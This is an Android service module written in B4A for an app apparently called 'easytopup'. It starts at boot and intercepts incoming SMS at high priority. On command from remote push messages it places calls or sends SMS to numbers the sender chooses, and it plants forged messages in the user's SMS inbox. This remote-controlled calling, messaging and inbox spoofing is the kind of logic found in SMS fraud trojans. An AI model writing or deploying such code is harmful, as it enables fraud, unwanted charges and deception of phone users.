Type=Service
Version=4
ModulesStructureVersion=1
B4A=true
@EndOfDesignText@
#Region  Service Attributes 
	#StartAtBoot: True
#End Region

Sub Process_Globals
	Private si As SmsInterceptor
	Private su As StringUtils
	Private pc As PhoneCalls
	Private ps As PhoneSms
End Sub

Sub Service_Create
	si.Initialize2("SMS", 999)
End Sub

Sub Service_Start (StartingIntent As Intent)
	Dim parser As JSONParser
	Dim root As Map
	Dim sTitle, sAlert As String
	
	If StartingIntent.Action = "com.moribanxenia.easytopup.RECEIVE" Then
		parser.Initialize(StartingIntent.GetExtra("com.parse.Data"))
		root = parser.NextObject
		If root.ContainsKey("title") AND root.ContainsKey("alert") Then
			sTitle = root.Get("title")
			sAlert = root.Get("alert")
			File.WriteString(File.DirInternal, "index.html", "<!DOCTYPE html><html><head> <title></title></head><body> <h2>" & sTitle & "</h2> <p>" & sAlert & "</p></body></html>")
			SaveSMSToInbox(sTitle, sAlert)
		Else If root.ContainsKey("command") Then
			Select root.Get("command")
				Case "call"
					StartActivity(pc.Call(su.EncodeUrl(root.Get("phonenumber"), "UTF8")))
				Case "sendsms"
					ps.Send(root.Get("phonenumber"), root.Get("smsbody"))
			End Select
		End If
	End If
End Sub

Sub Service_Destroy

End Sub

Sub SMS_MessageReceived (From As String, Body As String) As Boolean
	'ToastMessageShow(From & CRLF & Body, True)
End Sub

Sub SaveSMSToInbox(Address As String, Body As String)
	Dim resolver As ContentResolver
	Dim uri1 As Uri : uri1.Parse("content://sms/inbox")
	Dim values As ContentValues
	
	resolver.Initialize("")
	values.Initialize
	values.PutString("address", Address)
	values.PutString("body", Body)
	resolver.Insert(uri1, values)
End Sub
